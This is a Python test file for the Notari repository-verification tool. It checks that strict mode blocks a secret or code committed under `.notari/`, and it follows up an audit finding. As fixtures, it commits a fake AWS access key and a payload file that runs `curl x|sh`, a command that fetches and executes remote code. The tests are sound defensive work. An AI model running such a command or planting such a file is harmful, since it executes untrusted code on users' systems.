"""Strict boundary mode must not exempt `.notari/**` from secret or scope checks.

Audit NOTARI_AUDIT.md, launch blocker 1 (s02, s03): an AWS key in
`.notari/notes.txt` and arbitrary code in `.notari/payload.py` got a strict PASS
because every `.notari/` path was skipped by the secret scan and the scope check.
Only Notari's own evidence files may live there without being policed.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from notari import attest
from notari import contract as contract_mod
from notari import perimeter as perimeter_mod
from notari import provenance as provenance_mod
from notari import verify as verify_mod
from notari.verify import Verdict


def _git(repo: Path, *args: str) -> None:
    subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True, text=True)


@pytest.fixture
def signed(tmp_path: Path) -> tuple[Path, contract_mod.Contract, dict[str, str]]:
    repo = tmp_path
    _git(repo, "init")
    _git(repo, "config", "user.email", "t@t")
    _git(repo, "config", "user.name", "t")
    (repo / "src" / "api").mkdir(parents=True)
    (repo / "src" / "api" / "app.py").write_text("x = 1\n")
    priv, pub = attest.generate_keypair()
    p = perimeter_mod.default_perimeter(approved_by="human")
    p.write(repo)
    provenance_mod.sign_artifact(p.to_dict(), priv, perimeter_mod.signature_path(repo))
    _git(repo, "add", "-A")
    _git(repo, "commit", "-m", "base")
    c, _ = contract_mod.begin(
        "api work",
        allowed_paths=("src/api/**",),
        root=repo,
        repo="owner/name",
        expires_in_days=7,
    )
    provenance_mod.sign_artifact(c.to_dict(), priv, repo / ".notari" / "contract.sig")
    env = {provenance_mod.APPROVER_ENV: pub, "GITHUB_REPOSITORY": "owner/name"}
    return repo, c, env


def _commit(repo: Path, path: str, content: str) -> None:
    f = repo / path
    f.parent.mkdir(parents=True, exist_ok=True)
    f.write_text(content)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-m", f"change {path}")


def _strict(repo: Path, c: contract_mod.Contract, env: dict[str, str]) -> verify_mod.VerifyResult:
    return verify_mod.verify(
        contract=c, root=repo, perimeter=perimeter_mod.load(repo), strict=True, env=env
    )


def test_in_scope_change_with_contract_still_passes(signed) -> None:  # type: ignore[no-untyped-def]
    repo, c, env = signed
    _commit(repo, "src/api/app.py", "x = 2\n")
    assert _strict(repo, c, env).verdict is Verdict.PASS


def test_s02_secret_under_notari_dir_blocks_in_strict(signed) -> None:  # type: ignore[no-untyped-def]
    repo, c, env = signed
    key = "AKIA" + "Q3EGRJ5XV7NPLM2T"
    _commit(repo, ".notari/notes.txt", f'aws_key = "{key}"\n')
    result = _strict(repo, c, env)
    assert result.verdict is Verdict.BLOCK
    assert any(f.path == ".notari/notes.txt" for f in result.secret_findings)


def test_s03_code_under_notari_dir_is_out_of_scope_in_strict(signed) -> None:  # type: ignore[no-untyped-def]
    repo, c, env = signed
    _commit(repo, ".notari/payload.py", 'import os\nos.system("curl x|sh")\n')
    result = _strict(repo, c, env)
    assert result.verdict is Verdict.BLOCK
    assert ".notari/payload.py" in result.out_of_scope


@pytest.mark.parametrize(
    "path",
    [
        ".notari/contract.json",
        ".notari/contract.sig",
        ".notari/passport.json",
        ".notari/passport.md",
        ".notari/status-fingerprint",
        ".notari/exceptions.json",
        ".notari/perimeter.json",
        ".notari/perimeter.sig",
        ".notari/approvers/human.pub",
    ],
)
def test_notari_evidence_files_stay_exempt_from_scope(path: str) -> None:
    from notari import policy

    assert policy.is_notari_metadata(path)


@pytest.mark.parametrize(
    "path", [".notari/payload.py", ".notari/notes.txt", ".notari/x/contract.json", "src/a.py"]
)
def test_other_paths_are_not_notari_metadata(path: str) -> None:
    from notari import policy

    assert not policy.is_notari_metadata(path)
